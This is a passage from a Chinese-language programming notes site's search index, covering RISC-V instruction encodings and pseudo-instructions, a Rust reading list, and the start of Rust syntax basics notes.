imm[4:0] 0100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asw rs2, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs2\uff0832 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_11","title":"\u73af\u5883\u8c03\u7528\u548c\u65ad\u70b9\u6307\u4ee4","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aecall</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u8bf7\u6c42\u73af\u5883\u8c03\u7528\uff08\u7c7b\u4f3c syscall\uff09\uff0cEEI \u4f1a\u5b9a\u4e49\u76f8\u5173\u53c2\u6570\u89c4\u8303\uff08\u4e00\u822c\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u53c2\uff09</li> </ul> ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aebreak</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u63a7\u5236\u6d41\u8f6c\u5230\u8c03\u8bd5\u73af\u5883</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_12","title":"\u6c47\u7f16\u4f2a\u6307\u4ee4","text":"<p>\u524d\u9762\u7684\u662f RV32I \u7684\u6240\u6709\u88ab\u7f16\u7801\u7684\u6307\u4ee4\uff0c\u4e0b\u9762\u662f\u53ef\u4ee5\u5728 RV32I \u6c47\u7f16\u7a0b\u5e8f\u4e2d\u5199\u7684\u4f2a\u6307\u4ee4\uff0c\u5b83\u4eec\u5c06\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u7b2c\u4e8c\u5217\u4e2d\u7684\u5b9e\u9645\u6307\u4ee4</p> \u4f2a\u6307\u4ee4 \u5b9e\u9645\u6307\u4ee4 \u610f\u4e49 la/lla rd, symbol auipc rd, delta[31 : 12] + delta[11]addi rd, rd, delta[11:0] \u52a0\u8f7d\u7edd\u5bf9\u5730\u5740delta = symbol - pc l{b|h|w} rd, symbol auipc rd, delta[31 : 12] + delta[11]l{b|h|w} rd, delta[11:0](rd) \u52a0\u8f7d\u5168\u5c40\u53d8\u91cf s{b|h|w} rd, symbol, rt auipc rt, delta[31 : 12] + delta[11]s{b|h|w} rd, delta[11:0](rt) \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf nop addi x0, x0, 0 li rd, imm ... \u5c06\u7acb\u5373\u6570\u52a0\u8f7d\u5230 rd \u4e2d mov rd, rs addi rd, rs, 0 \u4ece rs \u62f7\u8d1d\u5230 rd not rd, rs xori rd, rs, -1 rd = ~rs \u6309\u4f4d\u53d6\u53cd neg rd, rs sub rd, x0, rs rd = -rs seqz rd, rs sltiu rd, rs, 1 set rd if rs == 0 snez rd, rs sltu rd, x0, rs set rd if rs != 0 sltz rd, rs slt rd, rs, x0 set rd if rs &lt; 0 sgtz rd, rs slt rd, x0, rs set rd if rs &gt; 0 beqz rs, offset beq rs, x0, offset branch if rs == 0 bnez rs, offset bne rs, x0, offset branch if rs != 0 blez rs, offset bge x0, rs, offset branch if rs &lt;= 0 bgez rs, offset bge rs, x0, offset branch if rs &gt;= 0 bltz rs, offset blt rs, x0, offset branch if rs &lt; 0 bgtz rs, offset blt x0, rs, offset branch if rs &gt; 0 bgt rs, rt, offset blt rt, rs, offset branch if rs &gt; rt ble rs, rt, offset bge rt, rs, offset branch if rs &lt;= rt bgtu rs, rt, offset bltu rt, rs, offset branch if &gt; unsigned bleu rs, rt, offset bgeu rt, rs, offset branch if &lt;= unsigned j offset jal x0, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u4e0d\u5b58\u8fd4\u56de\u5730\u5740 jal offset jal x1, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u8fd4\u56de\u5730\u5740\u5b58\u5230 x1 jr rs jalr x0, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5ffd\u7565\u8fd4\u56de\u5730\u5740 jalr rs jalr x1, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5b58\u8fd4\u56de\u5730\u5740 ret jalr x0, 0(x1) \u901a\u8fc7\u8fd4\u56de\u5730\u5740 x1 \u8fd4\u56de call offset auipc x1, offset[31 : 12] + offset[11]jalr x1, offset[11:0](x1) \u8fdc\u8c03\u7528 tail offset auipc x6, offset[31 : 12] + offset[11]jalr x0, offset[11:0](x6) \u5ffd\u7565\u8fd4\u56de\u5730\u5740\u8fdc\u8c03\u7528"},{"location":"cs/pl/riscv/unprivileged/#rv64i","title":"RV64I \u9644\u52a0\u6307\u4ee4","text":"<p>RV64I \u7684\u5bc4\u5b58\u5668\u957f\u5ea6\u548c\u5730\u5740\u7a7a\u95f4\u957f\u5ea6\u90fd\u662f 64 \u4f4d\uff0c\u6307\u4ee4\u957f\u5ea6\u4ecd\u662f 32 \u4f4d\u3002\u9664\u6b64\u4e4b\u5916\u6bd4 RV32I \u591a\u4e86\u4e00\u4e9b\u9488\u5bf9 64/32 \u4f4d\u7684\u6307\u4ee4</p>"},{"location":"cs/pl/riscv/unprivileged/#_13","title":"\u6574\u578b\u8ba1\u7b97\u6307\u4ee4","text":""},{"location":"cs/pl/riscv/unprivileged/#32","title":"32 \u4f4d\u6574\u578b\u8ba1\u7b97","text":"addiw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0011011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaddiw rd, rs1, imm</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u4e0e imm \u76f8\u52a0\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> <li>\u6ce8\u610f\uff1aaddiw rd, rs1, 0 \u76f8\u5f53\u4e8e\u5c06 rs1 \u4f4e 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d\uff0c\u6c47\u7f16\u4f2a\u4ee3\u7801\u53ef\u5199\u4e3a sext.w rd, rs1</li> </ul> slliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0011011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aslliw rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u5de6\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> srliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0011011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrliw rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> sraiw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0011011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asraiw rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u7b97\u6570\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> addw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0111011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aaddw rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4e 32 \u4f4d\u52a0\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> subw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0111011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asubw rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4e 32 \u4f4d\u51cf\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> sllw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0111011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asllw rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4e 32 \u4f4d\u5de6\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> srlw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0111011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrlw rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul> sraw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0111011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asraw rd, rs1, rs2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4e 32 \u4f4d\u7b97\u672f\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_14","title":"\u5176\u5b83\u6307\u4ee4\u4fee\u6539","text":"<p>slli\u3001srli\u3001srai \u4e09\u6761\u6307\u4ee4\u4fee\u6539\u4e86\u683c\u5f0f\uff1a</p> slli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 001 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aslli rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5de6\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d</li> <li>\u6ce8\u610f\uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 slli \u591a\u4e86\u4e00\u4f4d shamt</li> </ul> srli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 101 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrli rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u903b\u8f91\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d</li> <li>\u6ce8\u610f\uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srli \u591a\u4e86\u4e00\u4f4d shamt</li> </ul> srai i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 010000 shamt rs1 101 rd 0010011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asrai rd, rs1, shamt</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u7b97\u6570\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d</li> <li>\u6ce8\u610f\uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srai \u591a\u4e86\u4e00\u4f4d shamt</li> </ul> <p>\u5176\u5b83\u683c\u5f0f\u6ca1\u6709\u4fee\u6539\u4f46\u529f\u80fd\u6709\u8c03\u6574\u7684\u6307\u4ee4\uff1a</p> <ul> <li>SLL/SRL/SRA\uff1a\u79fb\u4f4d\u4f4d\u6570\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 6 \u4f4d\uff08RV32I \u662f\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 5 \u4f4d\uff09</li> <li>LUI\uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u653e\u5165 rd \u7684 31~12 \u4f4d\uff0c\u4f4e 12 \u4f4d\u7f6e 0\uff0c\u7136\u540e\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d</li> <li>AUIPC\uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u540c LUI \u4e00\u6837\u5904\u7406\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c\u653e\u5165 rd</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#_15","title":"\u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4","text":"ld I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ald rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 64 \u4f4d\u6570\u5230 rd \u4e2d</li> </ul> lwu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 110 rd 0000011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alwu rd, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d\uff0c\u7136\u540e\u96f6\u6269\u5c55\u5230 64 \u4f4d</li> </ul> sd S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 011 imm[4:0] 0100011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asd rs2, imm(rs1)</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 rs2\uff0864 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d</li> </ul>"},{"location":"cs/pl/riscv/unprivileged/#zicsr","title":"Zicsr \u6269\u5c55","text":"<p>\u89c1\u7279\u6743\u7ea7\u90e8\u5206 &gt; \u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09&gt; CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09</p>"},{"location":"cs/pl/riscv/unprivileged/#_16","title":"\u6c47\u7f16\u4ee3\u7801","text":"<pre><code>    .text\n    .align 2\n    .globl main\nmain:\n    addi sp, sp, -16\n    sw ra, 12(sp)\n    lui a0, %hi(string1)\n    addi a0, a0, %lo(string1)\n    lui a1, %hi(string2)\n    addi a1, a1, %lo(string2)\n    call printf\n    lw ra, 12(sp)\n    addi sp, sp, 16\n    li a0, 0\n    ret\n\n    .section .rodata\n    .balign 4\nstring1:\n    .string \"Hello, %s!\\n\"\nstring2:\n    .string \"world\"\n</code></pre> <ul> <li>.text\uff1a\u8fdb\u5165\u4ee3\u7801\u6bb5</li> <li>.align 2\uff1a\u4ee3\u7801\u6bb5\u5bf9\u9f50\u5230 2^2 \u5b57\u8282</li> <li>.globl main\uff1a\u58f0\u660e\u5168\u5c40\u6807\u53f7 main</li> <li>.section .rodata\uff1a\u8fdb\u5165 rodata \u6bb5</li> <li>.balign 4\uff1a\u5bf9\u9f50\u6570\u636e\u6bb5\u5230 4 \u5b57\u8282</li> <li>.string ... \u5b9a\u4e49\u5b57\u7b26\u4e32</li> </ul> <p>\u5176\u5b83\u6307\u4ee4\uff1a</p> <ul> <li>.data\uff1a\u8fdb\u5165\u6570\u636e\u6bb5</li> <li>.bss\uff1a\u8fdb\u5165 bss \u6bb5</li> <li>.byte b1, b2, ..., bn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\u8282</li> <li>.half w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u534a\u5b57\uff0816 \u4f4d\uff09</li> <li>.word w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\uff0832 \u4f4d\uff09</li> </ul>"},{"location":"cs/pl/rust/","title":"Rust","text":"<p>A language empowering everyone to build reliable and efficient software. \u2014\u2014\u2014\u2014 Rust \u5b98\u7f51</p> <p>Rust \u662f\u7531 Mozilla \u4e3b\u5bfc\u5f00\u53d1\u7684\u901a\u7528\u3001\u7f16\u8bd1\u578b\u7f16\u7a0b\u8bed\u8a00\u3002\u8bbe\u8ba1\u51c6\u5219\u4e3a\u201c\u5b89\u5168\u3001\u5e76\u53d1\u3001\u5b9e\u7528\u201d\uff0c\u652f\u6301\u51fd\u6570\u5f0f\u3001\u5e76\u53d1\u5f0f\u3001\u8fc7\u7a0b\u5f0f\u4ee5\u53ca\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u98ce\u683c\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1</p>"},{"location":"cs/pl/rust/#table-of-contents","title":"Table of Contents","text":"<ul> <li>Rust \u8bed\u6cd5\u57fa\u7840</li> <li>Rust \u6742\u9879\u968f\u8bb0</li> </ul>"},{"location":"cs/pl/rust/#reading-list","title":"Reading List","text":"<ul> <li> Rust \u5723\u7ecf course.rs</li> <li> \u9508\u4e66 rusty.rs</li> <li> Rust By Example<ul> <li>https://doc.rust-lang.org/stable/rust-by-example/</li> <li>https://rustwiki.org/zh-CN/rust-by-example/</li> </ul> </li> <li> Cargo Book<ul> <li>https://doc.rust-lang.org/cargo/index.html</li> <li>https://rustwiki.org/zh-CN/cargo/</li> </ul> </li> <li> The Edition Guide<ul> <li>https://doc.rust-lang.org/edition-guide/introduction.html</li> <li>https://www.rustwiki.org.cn/zh-CN/edition-guide/</li> </ul> </li> <li> Command Line Applications in Rust<ul> <li>https://rust-cli.github.io/book/index.html</li> </ul> </li> <li> The Rust Reference<ul> <li>https://doc.rust-lang.org/stable/reference/</li> <li>https://rustwiki.org/zh-CN/reference/</li> </ul> </li> <li> The Rustonomicon<ul> <li>https://doc.rust-lang.org/nomicon/index.html</li> <li>https://nomicon.purewhite.io/</li> </ul> </li> <li> Rust \u4ee3\u7801\u9274\u8d4f algos.rs</li> <li> The Little Book of Rust Macros<ul> <li>https://veykril.github.io/tlborm/introduction.html</li> <li>https://zjp-cn.github.io/tlborm/</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/","title":"Rust \u8bed\u6cd5\u57fa\u7840","text":"<p> \u7ea6 15382 \u4e2a\u5b57  1059 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 65 \u5206\u949f</p> <p>Abstract</p> <p>\u57fa\u7840\u8bed\u6cd5\uff0c\u7b2c\u4e8c\u904d\u5b66\u7684\u65f6\u5019\u505a\u4e86\u70b9\u7b14\u8bb0</p> <p>\u53c2\u8003\uff1a</p> <ul> <li>Rust \u5723\u7ecf\uff0ccourse.rs</li> <li>The Rust Programming Language\uff0chttps://doc.rust-lang.org/book/</li> </ul>"},{"location":"cs/pl/rust/basic/#_1","title":"\u53d8\u91cf","text":""},{"location":"cs/pl/rust/basic/#_2","title":"\u6807\u8bc6\u7b26\u547d\u540d","text":"<ul> <li>\u539f\u751f\u6807\u8bc6\u7b26\uff08raw identifiers\uff09<ul> <li>\u5173\u952e\u5b57\u4e0d\u80fd\u4f5c\u4e3a\u6807\u8bc6\u7b26\u540d\u79f0</li> <li>\u52a0\u4e0a <code>r#</code> \u524d\u7f00\u540e\u53ef\u4ee5\u4f7f\u7528\uff0c\u6bd4\u5982 <code>r#match</code></li> </ul> </li> <li>\u547d\u540d\u89c4\u8303\uff1a</li> </ul> \u7c7b\u578b \u60ef\u4f8b\u65b9\u5f0f \u6a21\u5757 Modules <code>snake_case</code> \u7c7b\u578b Types <code>UpperCamelCase</code> \u7279\u5f81 Traits <code>UpperCamelCase</code> \u679a\u4e3e Enumerations <code>UpperCamelCase</code> \u7ed3\u6784\u4f53 Structs <code>UpperCamelCase</code> \u51fd\u6570 Functions <code>snake_case</code> \u65b9\u6cd5 Methods <code>snake_case</code> \u901a\u7528\u6784\u9020\u5668 General constructors <code>new</code> or <code>with_more_details</code> \u8f6c\u6362\u6784\u9020\u5668 Conversion constructors <code>from_some_other_type</code> \u5b8f Macros <code>snake_case!</code> \u5c40\u90e8\u53d8\u91cf Local variables <code>snake_case</code> \u9759\u6001\u7c7b\u578b Statics <code>SCREAMING_SNAKE_CASE</code> \u5e38\u91cf Constants <code>SCREAMING_SNAKE_CASE</code> \u7c7b\u578b\u53c2\u6570 Type parameters <code>UpperCamelCase</code>\uff0c\u901a\u5e38\u4f7f\u7528\u4e00\u4e2a\u5927\u5199\u5b57\u6bcd: T \u751f\u547d\u5468\u671f Lifetimes \u901a\u5e38\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd: 'a\uff0c'de\uff0c'src"},{"location":"cs/pl/rust/basic/#_3","title":"\u53d8\u91cf\u7ed1\u5b9a\u4e0e\u53ef\u53d8\u6027","text":"<p>rust \u4f7f\u7528 let \u5173\u952e\u5b57\u6765\u8fdb\u884c\u53d8\u91cf\u7ed1\u5b9a\uff0c\u5373 <code>let a = 1;</code></p> <p>\u800c rust \u7684\u53d8\u91cf\u9ed8\u8ba4\u662f\u4e0d\u53ef\u53d8\uff08immutable\uff09\u7684\uff0c\u4f7f\u4e4b\u53d8\u6210\u53ef\u53d8\u7684\u9700\u8981\u5728 let \u540e\u9762\u52a0\u4e0a mut\uff0c\u5982\u679c\u540e\u9762\u4e0d\u4f1a\u6539\u53d8\u7684\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a\u4e86 mutable \u7684\uff0c\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fa\u8b66\u544a</p> <p>\u5b58\u5728\u6ca1\u6709\u4f7f\u7528\u7684\u53d8\u91cf\u7684\u8bdd\u7f16\u8bd1\u5668\u4e5f\u4f1a\u7ed9\u51fa\u8b66\u544a\uff0c\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u5355\u4e0b\u5212\u7ebf\u5373\u53ef\u5ffd\u7565</p>"},{"location":"cs/pl/rust/basic/#_4","title":"\u53d8\u91cf\u89e3\u6784","text":"<p>\u7c7b\u4f3c\u4e8e python \u7684\u5143\u7d20\u89e3\u5305 <pre><code>let (a, mut b): (bool, bool) = (true, false);\nlet (a, b, c, d);\n(a, b) = (1, 2);\n[c, .., d, _] = [1, 2, 3, 4, 5]; // c = 1, d = 4\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_5","title":"\u5e38\u91cf","text":"<p>\u5e38\u91cf\u4f7f\u7528 const \u5173\u952e\u5b57\u6765\u5b9a\u4e49\uff0c\u4e14\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u901a\u5e38\u4e3a\u86c7\u5f62\u5168\u5927\u5199\uff0cconst \u540e\u9762\u4e5f\u4e0d\u5141\u8bb8\u4f7f\u7528 mut\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5185\u58f0\u660e <pre><code>const MAX_VALUE: u32 = 100_000;\n</code></pre></p>"},{"location":"cs/pl/rust/basic/#_6","title":"\u53d8\u91cf\u906e\u853d","text":"<p>rust \u4e2d\u53ef\u4ee5\u91cd\u590d\u58f0\u660e\u540c\u4e00\u540d\u79f0\u7684\u53d8\u91cf\uff0c\u8fd9\u4f1a\u518d\u6b21\u5206\u914d\u5185\u5b58\uff0c\u5e76\u5b8c\u5168\u906e\u853d\u6389\u524d\u9762\u7684\u540c\u540d\u53d8\u91cf</p>"},{"location":"cs/pl/rust/basic/#_7","title":"\u57fa\u672c\u7c7b\u578b","text":""},{"location":"cs/pl/rust/basic/#_8","title":"\u6574\u578b","text":"<p>i\u957f\u5ea6\uff08\u6709\u7b26\u53f7\uff09\u3001u\u957f\u5ea6\uff08\u65e0\u7b26\u53f7\uff09</p> <ul> <li>i8\u3001i16\u3001i32\u3001i64\u3001i128\u3001u8\u3001u16\u3001u32\u3001u64\u3001u128</li> <li>isize\u3001usize \u957f\u5ea6\u7531 CPU \u51b3\u5b9a\uff0c32 \u4f4d CPU \u5219\u662f 32 \u4f4d\uff0c64 \u4f4d CPU \u5219\u662f 64 \u4f4d</li> <li>\u6574\u578b\u5b57\u9762\u91cf\u4e2d\u95f4\u53ef\u4ee5\u63d2\u5165 _</li> <li>\u5b57\u9762\u91cf\u7ed3\u5c3e\u53ef\u4ee5\u63a5\u7c7b\u578b\uff0c\u4f8b\u5982 <code>10i32, 10_i32</code></li> <li>\u5b57\u9762\u91cf\uff0c\u5341\u516d\u8fdb\u5236 0x...\u3001\u516b\u8fdb\u5236 0o...\u3001\u4e8c\u8fdb\u5236 0b...\u3001\u5b57\u8282\uff08\u4ec5 u8\uff09b'A'</li> <li>\u6574\u578b\u9ed8\u8ba4\u4f7f\u7528 i32 \u7c7b\u578b</li> <li>\u4f7f\u7528 as \u6765\u8f6c\u6362\u7c7b\u578b\uff0c\u4f8b\u5982 <code>let a: u16 = 1_u8 as u16;</code></li> </ul> <p>debug \u6a21\u5f0f\u7f16\u8bd1\u65f6\u4ea7\u751f\u6ea2\u51fa\u4f1a panic\uff0c\u800c\u5728 release \u6a21\u5f0f\u4e0b\u5219\u4e0d\u4f1a panic\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\u3002\u4f46\u4e0d\u80fd\u4f9d\u8d56\u8fd9\u79cd\u884c\u4e3a\uff0c\u60f3\u8981\u8fd9\u6837\u7684\u6548\u679c\u5e94\u8be5\u6807\u51c6\u5e93\u7684\u4e00\u4e9b\u65b9\u6cd5\uff1a</p> <ul> <li>wrapping_* \u65b9\u6cd5\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\uff0c\u4f8b\u5982 <code>a.wrapping_add(1)</code></li> <li>checked_* \u65b9\u6cd5\uff0c\u5982\u679c\u4ea7\u751f\u6ea2\u51fa\u4e86\uff0c\u5219\u4f1a\u8fd4\u56de None</li> <li>overflowing_* \u65b9\u6cd5\uff0c\u8fd4\u56de\u7ed3\u679c\u4ee5\u53ca\u6307\u793a\u662f\u5426\u6ea2\u51fa\u7684\u5e03\u5c14\u503c</li> <li>saturating_* \u65b9\u6cd5\uff0c\u5982\u679c\u4f1a\u6ea2\u51fa\u5219\u4fdd\u6301\u5728\u6700\u5927/\u6700\u5c0f\u503c\u4e0a</li> </ul>"},{"location":"cs/pl/rust/basic/#_9","title":"\u5e03\u5c14\u7c7b\u578b","text":"<p>\u7c7b\u578b\u540d\u4e3a bool\uff0c\u503c\u4e3a true \u6216 false\uff0c\u5360\u7528 1 \u5b57\u8282\u5185\u5b58</p>"},{"location":"cs/pl/rust/basic/#_10","title":"\u6d6e\u70b9\u578b","text":"<ul> <li>f32 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u3001f64 \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a f64</li> <li>\u5e94\u8be5\u907f\u514d\u5224\u65ad\u6d6e\u70b9\u6570\u76f8\u7b49</li> <li>\u53ef\u4ee5\u4f7f\u7528 .is_nan() \u65b9\u6cd5\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u662f NaN</li> <li>\u6570\u503c\u4e0a\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5\uff0c\u6bd4\u5982 <code>3.14_f32.round()</code></li> </ul>"},{"location":"cs/pl/rust/basic/#_11","title":"\u8fd0\u7b97","text":"<ul> <li><code>+ - * / %</code>\uff1a\u52a0\u51cf\u4e58\u9664\u53d6\u6a21</li> <li><code>&amp; | ^ ! &lt;&lt; &gt;&gt;</code>\uff1a\u4f4d\u8fd0\u7b97</li> <li>\u540c\u6837\u7c7b\u578b\u624d\u80fd\u8fdb\u884c\u8ba1\u7b97\u3001\u7c7b\u578b\u8f6c\u6362\u5fc5\u987b\u662f\u663e\u5f0f\u7684</li> <li>\u5176\u5b83\u8fd0\u7b97\u53ef\u4ee5\u901a\u8fc7\u65b9\u6cd5\u5b9e\u73b0\uff0c.pow() \u8ba1\u7b97\u6307\u6570\uff0c.log() \u53d6\u5bf9\u6570\u3001.div_euclid() \u6574\u9664\u3001.div_floor() \u7b49\u7b49</li> </ul>"},{"location":"cs/pl/rust/basic/#_12","title":"\u5e8f\u5217","text":"<p>\u5728 for \u5faa\u73af\u4e2d\u5e38\u7528\uff0c\u7528\u6765\u751f\u6210\u8fde\u7eed\u7684\u6570\u503c\uff0c\u4ec5\u53ef\u4ee5\u4f7f\u7528\u6574\u6570\u3001\u5b57\u7b26\u7b49\u8fde\u7eed\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a</p> <pre><code>for i in 1..5 {\n    ...; // i = 1, 2, 3, 